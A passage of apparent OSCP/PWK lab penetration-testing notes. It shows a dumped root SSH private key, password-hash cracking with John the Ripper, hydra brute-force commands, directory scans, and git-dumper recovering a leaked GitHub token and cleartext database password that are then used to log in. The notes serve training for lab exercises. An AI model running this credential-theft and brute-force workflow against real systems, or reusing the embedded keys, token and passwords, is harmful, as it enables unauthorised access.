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
+XtqGq+3hvfaYsAAAAJcm9vdEBhZXJvAQI=
+-----END OPENSSH PRIVATE KEY-----
+
+root@oscp:/etc/ssh# cat ssh_host_rsa_key.pub
+cat ssh_host_rsa_key.pub
+ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCi/7Md8C4Np6BJgxvw5Jb8jJ+RYx+s7Wc7jWxTHhTMURFOTc6HH2XC0rvbZukvws+KficflBsI/B7RVgY454RK1NOGOqVd5FSIY3qol4MGH2/Sq03mfjcc8aMgni5OZd2DNZY7e8auGa3fDOci6PXOZaYxwwjn52Vt/iNZu8sAv3rf1sRLAikvk5fGlEbxLu1+zXDCySqP0IgeR+i7JcWUp8+xiwp2ZmURcAsFkM0TBm07MJKD+T+zPru2YxvsICXMMG37rV22KFqmk2p/8PF18WUqJpDPnPYEKZwGjbxa71STgQfUcFXeXU9QX3ofz/g0ZpxEg8wk2O9fNvYdZ454isgPWtxhHe9wii18eq4DBizwfHao1OI8iKpPbkQlrKmOrPqU55LXJR84n68cCPp8yH8Pd8Mv+AzV+9h0/u72XB/0AaFcgT5u7SnGoiTrx5e2eMzI+lFkm5xY+KJw5ZvTaC3MnD3LJugV6axmAH+9L6LDrLV8dkLq6kV8KpS9Ej0= root@aero
+
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ nano id_rsa 
+
+┌──(kali㉿kali)-[~/Desktop]
+└─$ sudo chmod 600 id_rsa                     
+
+sudo ssh -i id_rsa -p 22 mario
+sudo ssh -i id_rsa -p 22 root@192.168.225.143
+
+ssh2john id_rsa > ssh.hash
+
+cat ssh.hash
+
+john --wordlist=/usr/share/wordlists/rockyou.txt  --rules=sshRules ssh.hash
+
+
+			Cracking Hashes with John the Ripper
+https://null-byte.wonderhowto.com/how-to/crack-shadow-hashes-after-getting-root-linux-system-0186386/
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ nano passwd.txt    
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+aero:x:1000:1000:aero:/home/aero:/bin/bash
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+aerospike:x:997:998:Aerospike server:/opt/aerospike:/bin/sh
+mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
+postgres:x:114:119:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash
+ftp:x:115:120:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ nano shadow.txt
+root:$6$7zOHK3bMgyWveNZk$j5DoL/yHd/75mV.81oiSSCzlLtoFn1rXhIXB6G9LfoR.f3pBwpwNwOmqQcnmQ1Cg2/bZIow1ZDnse1mUm6V7y1:19412:0:99999:7:::
+daemon:*:18474:0:99999:7:::
+bin:*:18474:0:99999:7:::
+sys:*:18474:0:99999:7:::
+sync:*:18474:0:99999:7:::
+games:*:18474:0:99999:7:::
+man:*:18474:0:99999:7:::
+lp:*:18474:0:99999:7:::
+mail:*:18474:0:99999:7:::
+news:*:18474:0:99999:7:::
+uucp:*:18474:0:99999:7:::
+proxy:*:18474:0:99999:7:::
+www-data:*:18474:0:99999:7:::
+backup:*:18474:0:99999:7:::
+list:*:18474:0:99999:7:::
+irc:*:18474:0:99999:7:::
+gnats:*:18474:0:99999:7:::
+nobody:*:18474:0:99999:7:::
+systemd-network:*:18474:0:99999:7:::
+systemd-resolve:*:18474:0:99999:7:::
+systemd-timesync:*:18474:0:99999:7:::
+messagebus:*:18474:0:99999:7:::
+syslog:*:18474:0:99999:7:::
+_apt:*:18474:0:99999:7:::
+tss:*:18474:0:99999:7:::
+uuidd:*:18474:0:99999:7:::
+tcpdump:*:18474:0:99999:7:::
+landscape:*:18474:0:99999:7:::
+pollinate:*:18474:0:99999:7:::
+usbmux:*:18757:0:99999:7:::
+sshd:*:18757:0:99999:7:::
+systemd-coredump:!!:18757::::::
+aero:$6$TCwBE7vuGZA7Mokp$UMXRrNnuqaXJsXNhfpQO5p02YMb2obKDERE5LF00g/dQL8Cj1DZXCTfPaoNpZH4BJf1BI6wNuCuPD4RTXingH/:19412:0:99999:7:::
+lxd:!:18757::::::
+aerospike:!:18757::::::
+mysql:!:18757:0:99999:7:::
+postgres:*:18757:0:99999:7:::
+ftp:*:18757:0:99999:7:::
+
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ unshadow passwd.txt shadow.txt > passwords.txt
+                                                                                                 
+┌──(kali㉿kali)-[~/Desktop/A/143]
+└─$ john --wordlist=/usr/share/wordlists/rockyou.txt passwords.txt
+
+-------------------------------------------------------------------------------------------------
+				Crystal: 192.168.188.144
+NMAP: 
+- FTP:21
+- SSH:22
+- HTTP:80
+
+nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- 192.168.225.144
+
+21/tcp open  ftp     syn-ack vsftpd 3.0.5
+
+22/tcp open  ssh     syn-ack OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   256 fb:ea:e1:18:2f:1d:7b:5e:75:96:5a:98:df:3d:17:e4 (ECDSA)
+| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKsVbkM4POotpYfh0WatqzVPFWbtiDS0sp2YAxr55TtgpEbeVB8j6CCJjqKJvbgTkIvClq52Jd3XzmYJaK07Ue4=
+|   256 66:f4:54:42:1f:25:16:d7:f3:eb:f7:44:9f:5a:1a:0b (ED25519)
+|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIDqyf3tokk0DxqCJOiczEEGgFJsXh09VNspar/n7CtRs
+
+80/tcp open  http    syn-ack Apache httpd 2.4.52 ((Ubuntu))
+|_http-generator: Nicepage 4.21.12, nicepage.com
+|_http-title: Home
+| http-git: 
+|   192.168.225.144:80/.git/
+|     Git repository found!
+|     Repository description: Unnamed repository; edit this file 'description' to name the...
+|     Last commit message: Security Update 
+|     Remotes:
+|_      https://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@github.com/PWK-Challenge-Lab/dev.git
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+| http-methods: 
+|_  Supported Methods: OPTIONS HEAD GET POST
+Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+
+				BRUTE FORCE: 
+FTP: 
+ftp 192.168.225.144
+hydra -l luke -P /usr/share/wordlists/rockyou.txt 192.168.225.144 -t 4 ftp
+
+SSH: 
+ssh luke@192.168.225.144
+hydra -l luke -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.225.144
+hydra -l crystal -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.225.144
+
+				HTTP: 
+WAPPALIZER: 
+Font scripts
+- Google Font API
+Miscellaneous
+- Open Graph
+Web servers
+- Apache 2.4.52
+Programming languages
+- PHP
+Operating systems
+- Ubuntu
+Page builder
+- Nicepage 4.21.12
+JavaScript libraries
+- Skrollr 0.6.30
+- LazySizes
+- jQuery 3.5.1
+Performance
+- LazySizes
+
+http://192.168.225.144/Home.html
+
+				DIR BRUTE FORCE 
+WORDLISTS:
+/usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
+/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+/usr/share/seclists/Discovery/Web-Content/common.txt
+
+gobuster dir -u http://192.168.225.144 -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
+http://192.168.225.144:80/.git                 (Status: 301) [Size: 317] [--> http://192.168.225.144/.git/                                                                                      
+http://192.168.225.144:80/.git/config          (Status: 200) [Size: 306]
+http://192.168.225.144:80/.git/HEAD            (Status: 200) [Size: 21]
+http://192.168.225.144:80/.git/index           (Status: 200) [Size: 730]
+http://192.168.225.144:80/.git/logs/           (Status: 200) [Size: 1134]
+http://192.168.225.144:80/.htaccess            (Status: 403) [Size: 280]
+http://192.168.225.144:80/.hta                 (Status: 403) [Size: 280]
+http://192.168.225.144:80/.htpasswd            (Status: 403) [Size: 280]
+http://192.168.225.144:80/cms                  (Status: 301) [Size: 316] [--> http://192.168.225.144/cms/                                                              
+http://192.168.225.144:80/images               (Status: 301) [Size: 319] [--> http://192.168.225.144/images/
+http://192.168.225.144:80/index.html           (Status: 200) [Size: 46103]
+http://192.168.225.144:80/server-status        (Status: 403) [Size: 280]
+
+gobuster dir -u http://192.168.225.144/cms -w /usr/share/seclists/Discovery/Web-Content/common.txt -e txt,php,html,htm
+http://192.168.225.144/cms/.htpasswd            (Status: 403) [Size: 280]
+http://192.168.225.144/cms/.htaccess            (Status: 403) [Size: 280]
+http://192.168.225.144/cms/.hta                 (Status: 403) [Size: 280]
+http://192.168.225.144/cms/administrator        (Status: 301) [Size: 330] [--> http://192.168.225.144/cms/administrator/]
+http://192.168.225.144/cms/api                  (Status: 301) [Size: 320] [--> http://192.168.225.144/cms/api/]
+http://192.168.225.144/cms/cache                (Status: 301) [Size: 322] [--> http://192.168.225.144/cms/cache/]
+http://192.168.225.144/cms/components           (Status: 301) [Size: 327] [--> http://192.168.225.144/cms/components/]
+http://192.168.225.144/cms/images               (Status: 301) [Size: 323] [--> http://192.168.225.144/cms/images/]
+http://192.168.225.144/cms/includes             (Status: 301) [Size: 325] [--> http://192.168.225.144/cms/includes/]
+http://192.168.225.144/cms/index.php            (Status: 200) [Size: 1068]
+http://192.168.225.144/cms/installation         (Status: 301) [Size: 329] [--> http://192.168.225.144/cms/installation/]
+http://192.168.225.144/cms/language             (Status: 301) [Size: 325] [--> http://192.168.225.144/cms/language/]
+http://192.168.225.144/cms/layouts              (Status: 301) [Size: 324] [--> http://192.168.225.144/cms/layouts/]
+http://192.168.225.144/cms/libraries            (Status: 301) [Size: 326] [--> http://192.168.225.144/cms/libraries/]
+http://192.168.225.144/cms/media                (Status: 301) [Size: 322] [--> http://192.168.225.144/cms/media/]                                                                                 
+http://192.168.225.144/cms/modules              (Status: 301) [Size: 324] [--> http://192.168.225.144/cms/modules/]                                                                               
+http://192.168.225.144/cms/plugins              (Status: 301) [Size: 324] [--> http://192.168.225.144/cms/plugins/]                                                                               
+http://192.168.225.144/cms/templates            (Status: 301) [Size: 326] [--> http://192.168.225.144/cms/templates/]                                                                             
+http://192.168.225.144/cms/tmp                  (Status: 301) [Size: 320] [--> http://192.168.225.144/cms/tmp/]    
+
+http://192.168.225.144/cms/index.php 
+
+feroxbuster -u http://192.168.188.144 -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+200      GET       22l       95w     5501c http://192.168.188.144/images/2282272-a53296b6.png
+200      GET       22l      130w    10327c http://192.168.188.144/images/159832-67406b0e.png
+200      GET       25l      108w     7890c http://192.168.188.144/images/197430.png
+200      GET       25l      151w    12811c http://192.168.188.144/images/535239-7ec8b6a6.png
+200      GET       25l      115w    10396c http://192.168.188.144/images/197507.png
+200      GET       41l      187w    12658c http://192.168.188.144/images/953831-b84098f9.png
+200      GET       25l      103w     5553c http://192.168.188.144/images/561127-62cb0522.png
+200      GET       28l      241w    17032c http://192.168.188.144/images/3720937-98b53606.png
+200      GET       18l      114w    10037c http://192.168.188.144/images/4628635.png
+200      GET       22l      112w     7717c http://192.168.188.144/images/323275.png
+200      GET       29l      150w    10555c http://192.168.188.144/images/115968-2e2f0d19.png
+200      GET      490l     2529w    46103c http://192.168.188.144/Home.html
+200      GET       29l      191w    12540c http://192.168.188.144/images/171561-778b2060.png
+200      GET      188l      197w    23434c http://192.168.188.144/images/color-logo-5_150.png
+200      GET      193l      209w    24941c http://192.168.188.144/images/color-logo-2_150.png
+200      GET      194l      214w    26434c http://192.168.188.144/images/color-logo-1_150.png
+200      GET      195l      207w    26075c http://192.168.188.144/images/color-logo-3_150.png
+200      GET      191l      206w    25027c http://192.168.188.144/images/color-logo-4_150.png
+200      GET     2561l     4882w    50917c http://192.168.188.144/Home.css
+200      GET      404l     3541w   258077c http://192.168.188.144/images/595119f1-6ce3-edb5-2421-cc21a4b24655.jpg
+200      GET      386l     2264w   199215c http://192.168.188.144/images/dsddd.jpg
+200      GET        2l     1297w    89476c http://192.168.188.144/jquery.js
+200      GET       42l     4194w   246601c http://192.168.188.144/nicepage.js
+200      GET    38340l    83764w  1299887c http://192.168.188.144/nicepage.css
+200      GET      490l     2529w    46103c http://192.168.188.144/
+301      GET        9l       28w      316c http://192.168.188.144/cms => http://192.168.188.144/cms/
+200      GET      490l     2529w    46103c http://192.168.188.144/index.html
+
+
+http://192.168.188.144/cms
+http://192.168.188.144/images/
+
+feroxbuster -u http://192.168.188.144/cms -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+301      GET        9l       28w      316c http://192.168.188.144/cms => http://192.168.188.144/cms/
+301      GET        9l       28w      325c http://192.168.188.144/cms/includes => http://192.168.188.144/cms/includes/
+301      GET        9l       28w      325c http://192.168.188.144/cms/language => http://192.168.188.144/cms/language/
+301      GET        9l       28w      330c http://192.168.188.144/cms/administrator => http://192.168.188.144/cms/administrator/
+301      GET        9l       28w      323c http://192.168.188.144/cms/images => http://192.168.188.144/cms/images/
+301      GET        9l       28w      329c http://192.168.188.144/cms/installation => http://192.168.188.144/cms/installation/
+301      GET        9l       28w      324c http://192.168.188.144/cms/plugins => http://192.168.188.144/cms/plugins/
+301      GET        9l       28w      326c http://192.168.188.144/cms/libraries => http://192.168.188.144/cms/libraries/
+301      GET        9l       28w      327c http://192.168.188.144/cms/components => http://192.168.188.144/cms/components/
+301      GET        9l       28w      322c http://192.168.188.144/cms/cache => http://192.168.188.144/cms/cache/
+301      GET        9l       28w      326c http://192.168.188.144/cms/templates => http://192.168.188.144/cms/templates/
+301      GET        9l       28w      320c http://192.168.188.144/cms/tmp => http://192.168.188.144/cms/tmp/
+301      GET        9l       28w      322c http://192.168.188.144/cms/media => http://192.168.188.144/cms/media/
+301      GET        9l       28w      324c http://192.168.188.144/cms/modules => http://192.168.188.144/cms/modules/
+301      GET        9l       28w      320c http://192.168.188.144/cms/api => http://192.168.188.144/cms/api/
+200      GET       61l      235w     2209c http://192.168.188.144/cms/includes/app.php
+200      GET       38l     1475w    21131c http://192.168.188.144/cms/templates/system/incompatible.html
+200      GET       32l      138w     1068c http://192.168.188.144/cms/index.php
+301      GET        9l       28w      324c http://192.168.188.144/cms/layouts => http://192.168.188.144/cms/layouts/
+200      GET       74l      540w     4942c http://192.168.188.144/cms/README.txt
+200      GET      172l     1008w     6858c http://192.168.188.144/cms/htaccess.txt
+200      GET      339l     2968w    18092c http://192.168.188.144/cms/LICENSE.txt
+301      GET        9l       28w      320c http://192.168.188.144/cms/cli => http://192.168.188.144/cms/cli/
+
+http://192.168.188.144/cms/administrator/
+http://192.168.188.144/cms/api/
+http://192.168.188.144/cms/cli
+http://192.168.188.144/cms/includes/app.php
+http://192.168.188.144/cms/index.php
+
+feroxbuster -u http://192.168.188.144/cms/api/ -t 30 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x "txt,html,php,asp,aspx,jsp" -v -k -n -e 
+301      GET        9l       28w      331c http://192.168.188.144/cms/api/components => http://192.168.188.144/cms/api/components/
+200      GET       53l      205w     1854c http://192.168.188.144/cms/api/includes/app.php
+200      GET       31l      150w     1065c http://192.168.188.144/cms/api/
+301      GET        9l       28w      329c http://192.168.188.144/cms/api/includes => http://192.168.188.144/cms/api/includes/
+301      GET        9l       28w      329c http://192.168.188.144/cms/api/language => http://192.168.188.144/cms/api/language/
+
+http://192.168.188.144/cms/api/components/
+http://192.168.188.144/cms/api/includes/app.php
+
+				SEARCHSPLOIT
+WEB SERVER
+Apache 2.4.52
+http://192.168.225.144/images/
+┌──(kali㉿kali)-[~]
+└─$ searchsploit Apache 2.4.52
+Apache + PHP < 5.3.12 / < 5.4.2 - cgi-bin Remote Code Executio | php/remote/29290.c
+Apache + PHP < 5.3.12 / < 5.4.2 - Remote Code Execution + Scan | php/remote/29316.py
+Apache CXF < 2.5.10/2.6.7/2.7.4 - Denial of Service            | multiple/dos/26710.txt
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Ov | unix/remote/21671.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer  | unix/remote/47080.c
+Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer  | unix/remote/764.c
+Apache OpenMeetings 1.9.x < 3.1.0 - '.ZIP' File Directory Trav | linux/webapps/39642.txt
+Apache Tomcat < 5.5.17 - Remote Directory Listing              | multiple/remote/2061.txt
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal            | unix/remote/14489.c
+Apache Tomcat < 6.0.18 - 'utf8' Directory Traversal (PoC)      | multiple/remote/6229.txt
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - | jsp/webapps/42966.py
+Apache Tomcat < 9.0.1 (Beta) / < 8.5.23 / < 8.0.47 / < 7.0.8 - | windows/webapps/42953.txt
+Apache Xerces-C XML Parser < 3.1.2 - Denial of Service (PoC)   | linux/dos/36906.txt
+Webfroot Shoutbox < 2.32 (Apache) - Local File Inclusion / Rem | linux/remote/34.pl
+
+
+CMS
+JOOMLA 7.2.5
+PHP 5.2 
+http://192.168.225.144/cms/
+http://192.168.188.144/cms/index.php
+
+
+				GIT
+Git repository found!
+http://192.168.188.144/.git/
+https://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@github.com/PWK-Challenge-Lab/dev.git
+
+http://192.168.225.144/.git/logs/refs/heads/main
+luke@challenge.pwk
+0000000000000000000000000000000000000000 621a2e79b3a4a08bba12effe6331ff4513bad91a Stuart <luke@challenge.pwk> 1668808644 -0500	clone: from https://github.com/PWK-Challenge-Lab/dev.git
+
+http://192.168.225.144/.git/refs/heads/main
+44a055daf7a0cd777f28f444c0d29ddf3ff08c54
+
+ref: refs/remotes/origin/main
+
+$this->conn = new PDO("mysql:host=" . $this->host . ";dbname=" . $this->db_name, $this->username, $this->password);
+
+
+			git-dumper: 
+https://github.com/arthaud/git-dumper
+┌──(kali㉿kali)-[~/Desktop/WEB-APP]
+└─$ pip install git-dumper
+
+┌──(kali㉿kali)-[~/Desktop/WEB-APP]
+└─$ pwd                   
+/home/kali/Desktop/WEB-APP
+
+┌──(kali㉿kali)-[~/Desktop/WEB-APP]
+└─$ git-dumper http://192.168.188.144/.git/ /home/kali/Desktop/WEB-APP
+
+┌──(kali㉿kali)-[~/Desktop/WEB-APP/.git]
+└─$ git show 
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+diff --git a/configuration/database.php b/configuration/database.php
+index 55b1645..8ad08b0 100644
+--- a/configuration/database.php
++++ b/configuration/database.php
+@@ -2,8 +2,9 @@
+ class Database{
+     private $host = "localhost";
+     private $db_name = "staff";
+-    private $username = "stuart@challenge.lab";
+-    private $password = "BreakingBad92";
++    private $username = "";
++    private $password = "";
++// Cleartext creds cannot be added to public repos!
+     public $conn;
+     public function getConnection() {
+         $this->conn = null;
+
+
+┌──(kali㉿kali)-[~/Desktop/WEB-APP/.git]
+└─$ git log  
+commit 44a055daf7a0cd777f28f444c0d29ddf3ff08c54 (HEAD -> main)
+Author: Stuart <luke@challenge.pwk>
+Date:   Fri Nov 18 16:58:34 2022 -0500
+
+    Security Update
+
+commit 621a2e79b3a4a08bba12effe6331ff4513bad91a (origin/main, origin/HEAD)
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:57:12 2022 +0200
+
+    Create database.php
+
+commit c9c8e8bd0a4b373190c4258e16e07a6296d4e43c
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 23:56:19 2022 +0200
+
+    Delete database.php
+
+commit eda55ed6455d29532295684e3900cda74d695067
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:40 2022 +0200
+
+    Create robots.txt
+
+commit ce3d418cc1bb5c5388fdc00cee5ba1cb764f499b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:27:08 2022 +0200
+
+    Create search.php
+
+commit 80ad5fe45438bb1b9cc5932f56af2e9be7e96046
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:26:09 2022 +0200
+
+    Setting up database.php
+
+commit 58cfadc91978ec5db50a03c571493e3038d2935d
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:48 2022 +0200
+
+    Create index.php
+
+commit 5e212bcd0b8d5815af1c4fdfccd6a07c16e1330b
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:22:22 2022 +0200
+
+    Create order.php
+
+commit 0822a51f607bb05c0e6230acd74f27e7b6130934
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:21:50 2022 +0200
+
+    Create export.php
+
+commit 1c48db4a587970ee95208f3f408676505e343318
+Author: PWK-Challenge-Lab <118549472+PWK-Challenge-Lab@users.noreply.github.com>
+Date:   Fri Nov 18 17:21:11 2022 +0200
+
+    Initial commit
+
+
+				SSH: local.txt
+stuart@challenge.lab:BreakingBad92
+
+┌──(kali㉿kali)-[~]
+└─$ ssh stuart@192.168.188.144
+
+stuart@oscp:~$ whoami
+stuart
+
+stuart@oscp:~$ hostname
+oscp
+
+stuart@oscp:~$ id
+uid=1000(stuart) gid=1000(stuart) groups=1000(stuart),4(adm),24(cdrom),30(dip),46(plugdev)
+
+stuart@oscp:~$ ls
+local.txt
+
+stuart@oscp:~$ cat local.txt
+b6486a08a9d225a1e1e04b9b31dd86e0
+
+stuart@oscp:/home$ find / -name "local.txt" -ls 2> /dev/null
+  1052145      4 -rw-rw-r--   1 stuart   stuart         33 May  5 00:09 /home/stuart/local.txt
+
+
+
+				NETWORK: 
+stuart@oscp:/home$ ifconfig
+ens160: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
+        inet 192.168.188.144  netmask 255.255.255.0  broadcast 192.168.188.255
+        ether 00:50:56:ab:17:0f  txqueuelen 1000  (Ethernet)
+        RX packets 743140  bytes 112970380 (112.9 MB)
+        RX errors 0  dropped 5054  overruns 0  frame 0
+        TX packets 660157  bytes 323001414 (323.0 MB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
+        inet 127.0.0.1  netmask 255.0.0.0
+        loop  txqueuelen 1000  (Local Loopback)
+        RX packets 734  bytes 58835 (58.8 KB)
+        RX errors 0  dropped 0  overruns 0  frame 0
+        TX packets 734  bytes 58835 (58.8 KB)
+        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
+
+stuart@oscp:/home$ cat /etc/hosts
+127.0.0.1 localhost
+127.0.1.1 cllnw
+# The following lines are desirable for IPv6 capable hosts
+::1     ip6-localhost ip6-loopback
+fe00::0 ip6-localnet
